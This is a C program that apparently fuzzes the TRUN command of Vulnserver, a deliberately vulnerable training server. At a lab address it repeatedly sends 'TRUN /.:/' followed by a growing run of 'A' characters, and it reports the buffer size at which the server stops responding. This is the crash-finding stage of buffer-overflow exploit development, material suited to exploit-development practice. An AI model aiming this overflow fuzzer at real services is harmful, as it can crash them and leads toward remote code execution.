#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#define PORT 9999
#define REALLOC_BUFFER_SIZE 4096
// Borrowed Snippet
// https://codereview.stackexchange.com/questions/83229/c-string-appender-for-buffers-and-strings
char *append(char *orig_str, size_t *orig_str_size, const char *append_str) {
    // no action required if appending an empty string
    if (append_str[0] == 0) {
        return orig_str;
    }

    // does the current char* have enough space?
    size_t req_space = strlen(orig_str) + strlen(append_str) + 1; // +1 for NULL byte

    // resize if the required space is greater than the original buffer size.
    if (req_space > *orig_str_size) {
        // prepare the variable with the amount of space we want
        size_t allocate = *orig_str_size + req_space + REALLOC_BUFFER_SIZE;

        char *new_str = (char *)realloc(orig_str, allocate);
        // resize success..
        if (new_str == NULL) {
            fprintf(stderr, "Couldn't reallocate memory\n");
            return NULL;
        }

        // the realloc didn't fail, here is our new pointer
        orig_str = new_str;

        // overwrite the free space with NULL's
        memset(orig_str + strlen(orig_str), 0, req_space);

        // copy the appending text to the string
        strcpy(orig_str + strlen(orig_str), append_str);

        // modify the original size
        *orig_str_size = allocate;

    } else {
        // append the string
        strcpy(orig_str + strlen(orig_str), append_str);
    }

    return orig_str;
}

int main() {
  int sock;
  struct sockaddr_in vulnserver;
  char *trun = "TRUN /.:/";
  char *buffer;
  size_t buffer_size = 4096;
  int i;
  buffer = (char *)malloc(sizeof(char) * buffer_size);
  strcpy(buffer, trun);
  int synRetries = 2;
  bool ACTIVE = true;

  while (ACTIVE)
  {
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
      printf("\n Socket creation error \n");
      return -1;
    }
    vulnserver.sin_family = AF_INET;
    vulnserver.sin_port = htons(PORT);
    setsockopt(sock, IPPROTO_TCP, TCP_SYNCNT, &synRetries, sizeof(synRetries));

    if (inet_pton(AF_INET, "172.16.0.3", &vulnserver.sin_addr) <= 0)
    {
      printf("\nInvalid address / Address type not supported \n");

      return -1;
    }
    if (connect(sock, (struct sockaddr *)&vulnserver, sizeof(vulnserver)) < 0)
    {
      printf("\nConnection Failed\nBuffer size at crash: %d bytes", strlen(buffer));
      return 0;
    }

    for (i=1; i < 100; ++i) {
      buffer = append(buffer, &buffer_size, "A");
    }
    send(sock, buffer, strlen(buffer), 0);
    printf("Buffer sent: %d bytes \n", strlen(buffer));
    close(sock);
    sleep(1);
  }
  return 0;
}
